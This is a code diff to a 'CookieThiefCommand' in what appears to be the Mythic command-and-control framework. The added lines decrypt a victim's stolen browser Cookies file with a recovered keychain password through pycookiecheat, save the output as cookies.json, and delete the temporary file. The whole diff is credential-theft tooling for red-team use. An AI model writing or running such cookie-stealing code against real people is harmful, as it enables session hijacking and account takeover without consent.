@@ -144,4 +144,26 @@ class CookieThiefCommand(CommandBase):
             print("Encountered an error attempting to write the keychainDB to a file: " + str(e))
             sys.stdout.flush()
 
+
+        ## Decrypt Cookies file
+        try:
+            subprocess.run(["python2", "/Mythic/mythic/pycookiecheat/pycookiecheat.py", "--key " + ccs_password, "--cookies-file " + tmp_Cookies, "--output cookies.json"])
+            await MythicRPC().execute("create_output",task_id=task.id,output="Cookies decrypted")
+        except Exception as e:
+            print("PyCookieCheat script failed with error: " + str(e))
+            sys.stdout.flush()
+
+
+        ## Remove the Cookies file from disk
+        try:
+            if os.path.isfile('/Mythic/mythic/tmp_Cookies'):
+                os.remove('/Mythic/mythic/tmp_Cookies')
+            else:
+                print("Temp Cookies file does not exist.")
+                sys.stdout.flush()
+        except Exception as e:
+            print("Encountered an error attempting to remove the temporary Cookies file: " + str(e))
+            sys.stdout.flush()
+
+
         return task
